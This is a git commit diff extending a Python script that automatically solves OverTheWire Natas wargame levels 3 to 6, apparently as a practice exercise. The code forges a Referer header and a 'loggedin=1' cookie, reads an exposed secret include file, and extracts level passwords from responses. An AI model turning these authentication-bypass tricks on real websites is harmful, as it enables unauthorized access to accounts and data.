a5ca969cdc5e6c71688ebd137f64ff583b0cd793
Martin Wilks <martinwilks@Martins-MacBook-Pro.local>
2019-03-05 08:10:24 +0000

    Added Natas3, 4, 5 & 6

--- natas/natas.py
+++ natas/natas.py
@@ -12,11 +12,18 @@ from bs4 import BeautifulSoup
 def encodeCreds(username, password):
     stringToBeEncoded = username + ':' + password
     auth_64 = base64.b64encode(stringToBeEncoded)
+    # Base64 encoding is doing something weird and adding 'Cg== on the end'
+    auth_64 = auth_64.replace('Cg==', '')
     return(auth_64)
 
 def login(username, password, url, headers):
     with requests.Session() as s:
         post = s.get(url, headers=headers)
+    return(post.text)
+
+def post(username, password, url, headers, data):
+    with requests.Session() as s:
+        post = s.post(url, headers=headers, data=data)
     return(post.text)
 
 def eraseFile():
@@ -29,6 +36,16 @@ def writeToFlagFile(flagToWrite, level):
     filename = 'flags.txt'
     file = open(filename, "a")
     file.write('Level ' + level + ' - ' + flagToWrite + '\n')
+    file.close()
+    return()
+
+def cleanFlagFile():
+    fileName = 'flags.txt'
+    with open('flags.txt', 'r+') as file:
+        lines = file.readlines()
+        file.seek(0)
+        file.writelines(line for line in lines if line.strip())
+        file.truncate()
     file.close()
     return()
 
@@ -75,6 +92,7 @@ def natas2(natas2Password):
         for line in file:
             if userToMatch in line:
                 userPassword = line.replace('natas3:', '')
+                file.close()
                 break
     print('Password for next level is: ' + userPassword)
     os.remove('natas2.tmp')
@@ -91,9 +109,64 @@ def natas3(natas3Password):
     userPassword = ''
     print('[+] Logging into Natas 3 [+]')
     fileContent = requests.get(url, allow_redirects=True, headers=headers)
-    open('natas3.tmp', 'wb')
-    #TODO FINISH NATAS3
-    return()
+    open('natas3.tmp', 'wb').write(fileContent.content)
+    with open('natas3.tmp', 'r') as file:
+        for line in file:
+            if userToMatch in line:
+                userPassword = line.replace('natas4:', '')
+                break
+    file.close()
+    print('Password for next level is: ' + userPassword)
+    os.remove('natas3.tmp')
+    return(userPassword)
+
+def natas4(natas4Password):
+    url = 'http://natas4.natas.labs.overthewire.org'
+    username = 'natas4'
+    auth_64 = encodeCreds(username, natas4Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64,
+        'Referer' : 'http://natas5.natas.labs.overthewire.org/'
+    }
+    print('[+] Logging into Natas4 [+]')
+    response = login(username, natas4Password, url, headers)
+    natas5Password = response[836:868]
+    print('Password for the next level is: ' + natas5Password)
+    return(natas5Password)
+
+def natas5(natas5Password):
+    url = 'http://natas5.natas.labs.overthewire.org'
+    username = 'natas5'
+    auth_64 = encodeCreds(username, natas5Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64,
+        'Cookie' : 'loggedin=1'
+    }
+    print('[+] Logging into Natas5 [+]')
+    response = login(username, natas5Password, url, headers)
+    natas6Password = response[835:867]
+    print('Password for the next level is: ' + natas6Password)
+    return(natas6Password)
+
+def natas6(natas6Password):
+    url = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'
+    posturl = 'http://natas6.natas.labs.overthewire.org/'
+    username = 'natas6'
+    auth_64 = encodeCreds(username, natas6Password)
+    headers = {
+        'Authorization' : 'Basic ' + auth_64
+    }
+    print('[+] Logging into Natas 6 [+]')
+    response = login(username, natas6Password, url, headers)
+    secret = response[14:33]
+    data = {
+        'secret' : secret,
+        'submit' : 'Submit'
+    }
+    accessGrantedResponse = post(username, natas6Password, posturl, headers, data)
+    print(accessGrantedResponse)
+    natas7Password = accessGrantedResponse[836:868]
+    return(natas7Password)
 
 def main():
     os.system('clear')
@@ -105,6 +178,17 @@ def main():
     writeToFlagFile(natas2Password, '2')
     natas3Password = natas2(natas2Password)
     writeToFlagFile(natas3Password, '3')
+    natas4Password = natas3(natas3Password)
+    writeToFlagFile(natas4Password, '4')
+    natas5Password = natas4(natas4Password)
+    writeToFlagFile(natas5Password, '5')
+    natas6Password = natas5(natas5Password)
+    writeToFlagFile(natas6Password, '6')
+    natas7Password = natas6(natas6Password)
+    writeToFlagFile(natas7Password, '7')
+
+    cleanFlagFile()
+
 
 
 if __name__ == "__main__":
